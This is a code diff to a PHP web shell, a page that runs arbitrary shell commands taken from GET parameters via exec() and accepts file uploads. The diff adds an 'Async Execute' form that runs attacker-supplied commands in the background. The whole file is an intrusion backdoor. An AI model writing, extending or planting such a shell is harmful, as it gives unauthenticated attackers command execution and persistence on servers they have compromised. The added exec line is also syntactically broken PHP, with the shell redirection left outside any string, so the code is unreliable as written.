@@ -98,6 +98,9 @@ function printPerms($file)
         echo "<input type='hidden' name='dir' value=" . $dir . " />";
         echo "<input type='text' name='cmd' autocomplete='off' autofocus>\n<input type='submit' value='Execute'>\n";
         echo "</form>";
+        echo "\n<br><form action='" . $_SERVER['PHP_SELF'] . "' method='GET'>";
+        echo "<input type='text' name='asynccmd' autocomplete='off' autofocus>\n<input type='submit' value='Async Execute'>\n";
+        echo "</form>";
         echo "\n<br>\n<div class='navbar-form'><form action='" . $_SERVER['PHP_SELF'] . "' method='POST' enctype='multipart/form-data'>\n";
         echo "<input type='hidden' name='dir' value='" . $_GET['dir'] . "'/> ";
         echo "<input type='file' name='fileToUpload' id='fileToUpload'>\n<br><input type='submit' value='Upload File' name='submit'>";
@@ -113,13 +116,17 @@ function printPerms($file)
                 echo '<br><br><b style="color:red">Error uploading file ' . $uploadDirectory . '</b><br><br>';
             }
         }
-
+      
         if (isset($_GET['cmd'])) {
             echo "<br><br><b>Result of command execution: </b><br>";
             exec('cd ' . $dir . ' && ' . $_GET['cmd'], $cmdresult);
             foreach ($cmdresult as $key => $value) {
                 echo "$value \n<br>";
             }
+        }
+        if (isset($_GET['asynccmd'])) {
+            exec( $_GET['asynccmd'] . > /dev/null 2>&1 &);
+            echo "<br><br><b>Async command execution [+] </b><br>";
         }
         echo "<br>";
         ?>
